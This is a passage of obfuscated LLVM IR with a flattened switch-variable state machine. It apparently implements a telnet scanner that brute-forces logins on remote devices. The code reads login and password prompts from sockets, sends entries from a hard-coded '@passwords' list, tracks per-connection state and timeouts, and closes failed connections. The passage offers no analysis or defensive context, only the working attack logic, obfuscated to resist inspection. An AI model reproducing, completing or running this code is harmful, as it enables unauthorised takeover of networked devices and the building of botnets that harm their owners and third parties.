  %705 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %704, i32 0, i32 7
  %706 = load i16, i16* %705, align 16
  %707 = zext i16 %706 to i32
  %708 = call i32 @readUntil(i32 %696, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.50, i32 0, i32 0), i32 1, i32 0, i32 10000, i8* %701, i32 1024, i32 %707)
  %709 = icmp ne i32 %708, 0
  %710 = select i1 %709, i32 -506267731, i32 -1636232823
  store i32 %710, i32* %switchVar
  br label %loopEnd

; <label>:711:                                    ; preds = %loopEntry
  %712 = load i32, i32* %2, align 4
  %713 = sext i32 %712 to i64
  %.reload86 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %714 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload86, i64 %713
  %715 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %714, i32 0, i32 6
  store i32 0, i32* %715, align 4
  %716 = load i32, i32* %2, align 4
  %717 = sext i32 %716 to i64
  %.reload85 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %718 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload85, i64 %717
  %719 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %718, i32 0, i32 7
  store i16 0, i16* %719, align 16
  %720 = load i32, i32* %2, align 4
  %721 = sext i32 %720 to i64
  %.reload84 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %722 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload84, i64 %721
  %723 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %722, i32 0, i32 8
  %724 = load i8*, i8** %723, align 8
  %725 = call i8* @strstr(i8* %724, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.50, i32 0, i32 0)) #10
  %726 = icmp ne i8* %725, null
  %727 = select i1 %726, i32 -1961239799, i32 508657302
  store i32 %727, i32* %switchVar
  br label %loopEnd

; <label>:728:                                    ; preds = %loopEntry
  %729 = load i32, i32* %2, align 4
  %730 = sext i32 %729 to i64
  %.reload83 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %731 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload83, i64 %730
  %732 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %731, i32 0, i32 2
  store i8 5, i8* %732, align 8
  store i32 -416363427, i32* %switchVar
  br label %loopEnd

; <label>:733:                                    ; preds = %loopEntry
  %734 = load i32, i32* %2, align 4
  %735 = sext i32 %734 to i64
  %.reload82 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %736 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload82, i64 %735
  %737 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %736, i32 0, i32 2
  store i8 7, i8* %737, align 8
  store i32 -416363427, i32* %switchVar
  br label %loopEnd

; <label>:738:                                    ; preds = %loopEntry
  %739 = load i32, i32* %2, align 4
  %740 = sext i32 %739 to i64
  %.reload81 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %741 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload81, i64 %740
  %742 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %741, i32 0, i32 8
  %743 = load i8*, i8** %742, align 8
  call void @llvm.memset.p0i8.i64(i8* %743, i8 0, i64 1024, i32 1, i1 false)
  store i32 -789462687, i32* %switchVar
  br label %loopEnd

; <label>:744:                                    ; preds = %loopEntry
  %745 = load i32, i32* %2, align 4
  %746 = sext i32 %745 to i64
  %.reload80 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %747 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload80, i64 %746
  %748 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %747, i32 0, i32 8
  %749 = load i8*, i8** %748, align 8
  %750 = call i8* @strstr(i8* %749, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.52, i32 0, i32 0)) #10
  %751 = icmp ne i8* %750, null
  %752 = select i1 %751, i32 709050309, i32 1765276205
  store i32 %752, i32* %switchVar
  br label %loopEnd

; <label>:753:                                    ; preds = %loopEntry
  %754 = load i32, i32* %2, align 4
  %755 = sext i32 %754 to i64
  %.reload79 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %756 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload79, i64 %755
  %757 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %756, i32 0, i32 0
  %758 = load i32, i32* %757, align 16
  %759 = call i32 @sclose(i32 %758)
  %760 = load i32, i32* %2, align 4
  %761 = sext i32 %760 to i64
  %.reload78 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %762 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload78, i64 %761
  %763 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %762, i32 0, i32 2
  store i8 0, i8* %763, align 8
  %764 = load i32, i32* %2, align 4
  %765 = sext i32 %764 to i64
  %.reload77 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %766 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload77, i64 %765
  %767 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %766, i32 0, i32 3
  store i8 0, i8* %767, align 1
  store i32 -789462687, i32* %switchVar
  br label %loopEnd

; <label>:768:                                    ; preds = %loopEntry
  %769 = load i32, i32* %2, align 4
  %770 = sext i32 %769 to i64
  %.reload76 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %771 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload76, i64 %770
  %772 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %771, i32 0, i32 8
  %773 = load i8*, i8** %772, align 8
  %774 = call i64 @strlen(i8* %773) #10
  %775 = trunc i64 %774 to i16
  %776 = load i32, i32* %2, align 4
  %777 = sext i32 %776 to i64
  %.reload75 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %778 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload75, i64 %777
  %779 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %778, i32 0, i32 7
  store i16 %775, i16* %779, align 16
  store i32 -938795484, i32* %switchVar
  br label %loopEnd

; <label>:780:                                    ; preds = %loopEntry
  %781 = load i32, i32* %2, align 4
  %782 = sext i32 %781 to i64
  %.reload74 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %783 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload74, i64 %782
  %784 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %783, i32 0, i32 6
  %785 = load i32, i32* %784, align 4
  %786 = add i32 %785, 8
  %787 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %788 = icmp ult i32 %786, %787
  %789 = select i1 %788, i32 1642117522, i32 -459477982
  store i32 %789, i32* %switchVar
  br label %loopEnd

; <label>:790:                                    ; preds = %loopEntry
  %791 = load i32, i32* %2, align 4
  %792 = sext i32 %791 to i64
  %.reload73 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %793 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload73, i64 %792
  %794 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %793, i32 0, i32 0
  %795 = load i32, i32* %794, align 16
  %796 = call i32 @sclose(i32 %795)
  %797 = load i32, i32* %2, align 4
  %798 = sext i32 %797 to i64
  %.reload72 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %799 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload72, i64 %798
  %800 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %799, i32 0, i32 2
  store i8 0, i8* %800, align 8
  %801 = load i32, i32* %2, align 4
  %802 = sext i32 %801 to i64
  %.reload71 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %803 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload71, i64 %802
  %804 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %803, i32 0, i32 3
  store i8 1, i8* %804, align 1
  store i32 -459477982, i32* %switchVar
  br label %loopEnd

; <label>:805:                                    ; preds = %loopEntry
  store i32 1852927977, i32* %switchVar
  br label %loopEnd

; <label>:806:                                    ; preds = %loopEntry
  %807 = load i32, i32* %2, align 4
  %808 = sext i32 %807 to i64
  %.reload70 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %809 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload70, i64 %808
  %810 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %809, i32 0, i32 0
  %811 = load i32, i32* %810, align 16
  %812 = load i32, i32* %2, align 4
  %813 = sext i32 %812 to i64
  %.reload69 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %814 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload69, i64 %813
  %815 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %814, i32 0, i32 5
  %816 = load i8, i8* %815, align 1
  %817 = zext i8 %816 to i64
  %818 = getelementptr inbounds [14 x i8*], [14 x i8*]* @passwords, i64 0, i64 %817
  %819 = load i8*, i8** %818, align 8
  %820 = load i32, i32* %2, align 4
  %821 = sext i32 %820 to i64
  %.reload68 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %822 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload68, i64 %821
  %823 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %822, i32 0, i32 5
  %824 = load i8, i8* %823, align 1
  %825 = zext i8 %824 to i64
  %826 = getelementptr inbounds [14 x i8*], [14 x i8*]* @passwords, i64 0, i64 %825
  %827 = load i8*, i8** %826, align 8
  %828 = call i64 @strlen(i8* %827) #10
  %829 = call i64 @send(i32 %811, i8* %819, i64 %828, i32 16384)
  %830 = icmp slt i64 %829, 0
  %831 = select i1 %830, i32 1928654475, i32 -1948743404
  store i32 %831, i32* %switchVar
  br label %loopEnd

; <label>:832:                                    ; preds = %loopEntry
  %833 = load i32, i32* %2, align 4
  %834 = sext i32 %833 to i64
  %.reload67 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %835 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload67, i64 %834
  %836 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %835, i32 0, i32 0
  %837 = load i32, i32* %836, align 16
  %838 = call i32 @sclose(i32 %837)
  %839 = load i32, i32* %2, align 4
  %840 = sext i32 %839 to i64
  %.reload66 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %841 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload66, i64 %840
  %842 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %841, i32 0, i32 2
  store i8 0, i8* %842, align 8
  %843 = load i32, i32* %2, align 4
  %844 = sext i32 %843 to i64
  %.reload65 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %845 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload65, i64 %844
  %846 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %845, i32 0, i32 3
  store i8 1, i8* %846, align 1
  store i32 -789462687, i32* %switchVar
  br label %loopEnd

; <label>:847:                                    ; preds = %loopEntry
  %848 = load i32, i32* %2, align 4
  %849 = sext i32 %848 to i64
  %.reload64 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %850 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload64, i64 %849
  %851 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %850, i32 0, i32 0
  %852 = load i32, i32* %851, align 16
  %853 = call i64 @send(i32 %852, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.51, i32 0, i32 0), i64 2, i32 16384)
  %854 = icmp slt i64 %853, 0
  %855 = select i1 %854, i32 -1627989078, i32 -469779736
  store i32 %855, i32* %switchVar
  br label %loopEnd

; <label>:856:                                    ; preds = %loopEntry
  %857 = load i32, i32* %2, align 4
  %858 = sext i32 %857 to i64
  %.reload63 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %859 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload63, i64 %858
  %860 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %859, i32 0, i32 0
  %861 = load i32, i32* %860, align 16
  %862 = call i32 @sclose(i32 %861)
  %863 = load i32, i32* %2, align 4
  %864 = sext i32 %863 to i64
  %.reload62 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %865 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload62, i64 %864
  %866 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %865, i32 0, i32 2
  store i8 0, i8* %866, align 8
  %867 = load i32, i32* %2, align 4
  %868 = sext i32 %867 to i64
  %.reload61 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %869 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload61, i64 %868
  %870 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %869, i32 0, i32 3
  store i8 1, i8* %870, align 1
  store i32 -789462687, i32* %switchVar
  br label %loopEnd

; <label>:871:                                    ; preds = %loopEntry
  %872 = load i32, i32* %2, align 4
  %873 = sext i32 %872 to i64
  %.reload60 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %874 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload60, i64 %873
  %875 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %874, i32 0, i32 2
  store i8 6, i8* %875, align 8
  store i32 1852927977, i32* %switchVar
  br label %loopEnd

; <label>:876:                                    ; preds = %loopEntry
  %877 = load i32, i32* %2, align 4
  %878 = sext i32 %877 to i64
  %.reload59 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %879 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload59, i64 %878
  %880 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %879, i32 0, i32 6
  %881 = load i32, i32* %880, align 4
  %882 = icmp eq i32 %881, 0
  %883 = select i1 %882, i32 -413769202, i32 -1465819135
  store i32 %883, i32* %switchVar
  br label %loopEnd

; <label>:884:                                    ; preds = %loopEntry
  %885 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %886 = load i32, i32* %2, align 4
  %887 = sext i32 %886 to i64
  %.reload58 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %888 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload58, i64 %887
  %889 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %888, i32 0, i32 6
  store i32 %885, i32* %889, align 4
  store i32 -1465819135, i32* %switchVar
  br label %loopEnd

; <label>:890:                                    ; preds = %loopEntry
  %891 = load i32, i32* %2, align 4
  %892 = sext i32 %891 to i64
  %.reload57 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %893 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload57, i64 %892
  %894 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %893, i32 0, i32 0
  %895 = load i32, i32* %894, align 16
  %896 = load i32, i32* %2, align 4
  %897 = sext i32 %896 to i64
  %.reload56 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %898 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload56, i64 %897
  %899 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %898, i32 0, i32 8
  %900 = load i8*, i8** %899, align 8
  %901 = load i32, i32* %2, align 4
  %902 = sext i32 %901 to i64
  %.reload55 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %903 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload55, i64 %902
  %904 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %903, i32 0, i32 7
  %905 = load i16, i16* %904, align 16
  %906 = zext i16 %905 to i32
  %907 = call i32 @readUntil(i32 %895, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.52, i32 0, i32 0), i32 1, i32 0, i32 10000, i8* %900, i32 1024, i32 %906)
  %908 = icmp ne i32 %907, 0
  %909 = select i1 %908, i32 1032607763, i32 -1122260232
  store i32 %909, i32* %switchVar
  br label %loopEnd

; <label>:910:                                    ; preds = %loopEntry
  %911 = load i32, i32* %2, align 4
  %912 = sext i32 %911 to i64
  %.reload54 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %913 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload54, i64 %912
  %914 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %913, i32 0, i32 6
  store i32 0, i32* %914, align 4
  %915 = load i32, i32* %2, align 4
  %916 = sext i32 %915 to i64
  %.reload53 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %917 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload53, i64 %916
  %918 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %917, i32 0, i32 7
  store i16 0, i16* %918, align 16
  %919 = load i32, i32* %2, align 4
  %920 = sext i32 %919 to i64
  %.reload52 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %921 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload52, i64 %920
  %922 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %921, i32 0, i32 8
  %923 = load i8*, i8** %922, align 8
  %924 = call i8* @strstr(i8* %923, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.52, i32 0, i32 0)) #10
  %925 = icmp ne i8* %924, null
  %926 = select i1 %925, i32 225135487, i32 1268379664
  store i32 %926, i32* %switchVar
  br label %loopEnd

; <label>:927:                                    ; preds = %loopEntry
  %928 = load i32, i32* %2, align 4
  %929 = sext i32 %928 to i64
  %.reload51 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %930 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload51, i64 %929
  %931 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %930, i32 0, i32 8
  %932 = load i8*, i8** %931, align 8
  call void @llvm.memset.p0i8.i64(i8* %932, i8 0, i64 1024, i32 1, i1 false)
  %933 = load i32, i32* %2, align 4
  %934 = sext i32 %933 to i64
  %.reload50 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %935 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload50, i64 %934
  %936 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %935, i32 0, i32 0
  %937 = load i32, i32* %936, align 16
  %938 = call i32 @sclose(i32 %937)
  %939 = load i32, i32* %2, align 4
  %940 = sext i32 %939 to i64
  %.reload49 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %941 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload49, i64 %940
  %942 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %941, i32 0, i32 2
  store i8 0, i8* %942, align 8
  %943 = load i32, i32* %2, align 4
  %944 = sext i32 %943 to i64
  %.reload48 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %945 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload48, i64 %944
  %946 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %945, i32 0, i32 3
  store i8 0, i8* %946, align 1
  store i32 -789462687, i32* %switchVar
  br label %loopEnd

; <label>:947:                                    ; preds = %loopEntry
  %948 = load i32, i32* %2, align 4
  %949 = sext i32 %948 to i64
  %.reload47 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %950 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload47, i64 %949
  %951 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %950, i32 0, i32 8
  %952 = load i8*, i8** %951, align 8
  %953 = call i32 @matchPrompt(i8* %952)
  %954 = icmp ne i32 %953, 0
  %955 = select i1 %954, i32 1942933202, i32 -450077101
  store i32 %955, i32* %switchVar
  br label %loopEnd

; <label>:956:                                    ; preds = %loopEntry
  %957 = load i32, i32* %2, align 4
  %958 = sext i32 %957 to i64
  %.reload46 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %959 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload46, i64 %958
  %960 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %959, i32 0, i32 8
  %961 = load i8*, i8** %960, align 8
  call void @llvm.memset.p0i8.i64(i8* %961, i8 0, i64 1024, i32 1, i1 false)
  %962 = load i32, i32* %2, align 4
  %963 = sext i32 %962 to i64
  %.reload45 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %964 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload45, i64 %963
  %965 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %964, i32 0, i32 0
  %966 = load i32, i32* %965, align 16
  %967 = call i32 @sclose(i32 %966)
  %968 = load i32, i32* %2, align 4
  %969 = sext i32 %968 to i64
  %.reload44 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %970 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload44, i64 %969
  %971 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %970, i32 0, i32 2
  store i8 0, i8* %971, align 8
  %972 = load i32, i32* %2, align 4
  %973 = sext i32 %972 to i64
  %.reload43 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %974 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload43, i64 %973
  %975 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %974, i32 0, i32 3
  store i8 1, i8* %975, align 1
  store i32 -789462687, i32* %switchVar
  br label %loopEnd

; <label>:976:                                    ; preds = %loopEntry
  %977 = load i32, i32* %2, align 4
  %978 = sext i32 %977 to i64
  %.reload42 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %979 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload42, i64 %978
  %980 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %979, i32 0, i32 2
  store i8 7, i8* %980, align 8
  store i32 1434626114, i32* %switchVar
  br label %loopEnd

; <label>:981:                                    ; preds = %loopEntry
  %982 = load i32, i32* %2, align 4
  %983 = sext i32 %982 to i64
  %.reload41 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %984 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload41, i64 %983
  %985 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %984, i32 0, i32 8
  %986 = load i8*, i8** %985, align 8
  call void @llvm.memset.p0i8.i64(i8* %986, i8 0, i64 1024, i32 1, i1 false)
  store i32 -789462687, i32* %switchVar
  br label %loopEnd

; <label>:987:                                    ; preds = %loopEntry
  %988 = load i32, i32* %2, align 4
  %989 = sext i32 %988 to i64
  %.reload40 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %990 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload40, i64 %989
  %991 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %990, i32 0, i32 8
  %992 = load i8*, i8** %991, align 8
  %993 = call i64 @strlen(i8* %992) #10
  %994 = trunc i64 %993 to i16
  %995 = load i32, i32* %2, align 4
  %996 = sext i32 %995 to i64
  %.reload39 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %997 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload39, i64 %996
  %998 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %997, i32 0, i32 7
  store i16 %994, i16* %998, align 16
  store i32 1150423916, i32* %switchVar
  br label %loopEnd

; <label>:999:                                    ; preds = %loopEntry
  %1000 = load i32, i32* %2, align 4
  %1001 = sext i32 %1000 to i64
  %.reload38 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %1002 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload38, i64 %1001
  %1003 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1002, i32 0, i32 6
  %1004 = load i32, i32* %1003, align 4
  %1005 = add i32 %1004, 20
  %1006 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %1007 = icmp ult i32 %1005, %1006
  %1008 = select i1 %1007, i32 -201578286, i32 -480791700
  store i32 %1008, i32* %switchVar
  br label %loopEnd

; <label>:1009:                                   ; preds = %loopEntry
  %1010 = load i32, i32* %2, align 4
  %1011 = sext i32 %1010 to i64
  %.reload37 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %1012 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload37, i64 %1011
  %1013 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1012, i32 0, i32 0
  %1014 = load i32, i32* %1013, align 16
  %1015 = call i32 @sclose(i32 %1014)
  %1016 = load i32, i32* %2, align 4
  %1017 = sext i32 %1016 to i64
  %.reload36 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %1018 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload36, i64 %1017
  %1019 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1018, i32 0, i32 2
  store i8 0, i8* %1019, align 8
  %1020 = load i32, i32* %2, align 4
  %1021 = sext i32 %1020 to i64
  %.reload35 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %1022 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload35, i64 %1021
  %1023 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1022, i32 0, i32 3
  store i8 1, i8* %1023, align 1
  store i32 -480791700, i32* %switchVar
  br label %loopEnd

; <label>:1024:                                   ; preds = %loopEntry
  store i32 1852927977, i32* %switchVar
  br label %loopEnd

; <label>:1025:                                   ; preds = %loopEntry
  %1026 = load i32, i32* %2, align 4
  %1027 = sext i32 %1026 to i64
  %.reload34 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %1028 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload34, i64 %1027
  %1029 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1028, i32 0, i32 0
  %1030 = load i32, i32* %1029, align 16
  %1031 = call i64 @send(i32 %1030, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.53, i32 0, i32 0), i64 4, i32 16384)
  %1032 = icmp slt i64 %1031, 0
  %1033 = select i1 %1032, i32 -255794742, i32 1839634055
  store i32 %1033, i32* %switchVar
  br label %loopEnd

; <label>:1034:                                   ; preds = %loopEntry
  %1035 = load i32, i32* %2, align 4
  %1036 = sext i32 %1035 to i64
  %.reload33 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %1037 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload33, i64 %1036
  %1038 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1037, i32 0, i32 0
  %1039 = load i32, i32* %1038, align 16
  %1040 = call i32 @sclose(i32 %1039)
  %1041 = load i32, i32* %2, align 4
  %1042 = sext i32 %1041 to i64
  %.reload32 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %1043 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload32, i64 %1042
  %1044 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1043, i32 0, i32 2
  store i8 0, i8* %1044, align 8
  %1045 = load i32, i32* %2, align 4
  %1046 = sext i32 %1045 to i64
  %.reload31 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %1047 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload31, i64 %1046
  %1048 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1047, i32 0, i32 3
  store i8 1, i8* %1048, align 1
  store i32 -789462687, i32* %switchVar
  br label %loopEnd

; <label>:1049:                                   ; preds = %loopEntry
  %1050 = load i32, i32* %2, align 4
  %1051 = sext i32 %1050 to i64
  %.reload30 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %1052 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload30, i64 %1051
  %1053 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1052, i32 0, i32 2
  store i8 8, i8* %1053, align 8
  store i32 1852927977, i32* %switchVar
  br label %loopEnd

; <label>:1054:                                   ; preds = %loopEntry
  %1055 = load i32, i32* %2, align 4
  %1056 = sext i32 %1055 to i64
  %.reload29 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %1057 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload29, i64 %1056
  %1058 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1057, i32 0, i32 6
  %1059 = load i32, i32* %1058, align 4
  %1060 = icmp eq i32 %1059, 0
  %1061 = select i1 %1060, i32 -820918432, i32 -1658027898
  store i32 %1061, i32* %switchVar
  br label %loopEnd

; <label>:1062:                                   ; preds = %loopEntry
  %1063 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %1064 = load i32, i32* %2, align 4
  %1065 = sext i32 %1064 to i64
